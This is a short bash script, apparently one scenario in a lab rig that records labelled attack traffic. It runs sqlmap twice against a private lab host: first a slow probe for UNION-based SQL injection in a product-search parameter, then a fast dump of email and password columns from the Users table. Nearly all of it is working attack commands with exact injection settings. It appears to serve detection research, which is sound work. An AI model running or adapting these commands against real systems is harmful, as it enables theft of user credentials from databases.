#!/usr/bin/env bash
# ATK-08 variant c: loud, in two runs. Run 1 only finds the injection (no --dump), with --delay so the
# probing lasts about 90 s; run 2 dumps Users reusing run 1's session file (no new probing), as fast
# as sqlmap goes. One recording; the two traffic logs are joined in order. sqlmap's own user agent.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: sqlmap 1.10.11
# label: loud: slow sqlmap probing, then a fast dump of Users from the saved session, sqlmap user agent
set -eu
common=(-u 'http://10.66.0.10/rest/products/search?q=apple' -p q --dbms=sqlite --technique=U
  --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' --output-dir=/out/sqlmap)
sqlmap "${common[@]}" --delay=1.2 -t /out/traffic-1.txt
sqlmap "${common[@]}" -T Users -C email,password --dump -t /out/traffic-2.txt
cat /out/traffic-1.txt /out/traffic-2.txt > /out/traffic.txt
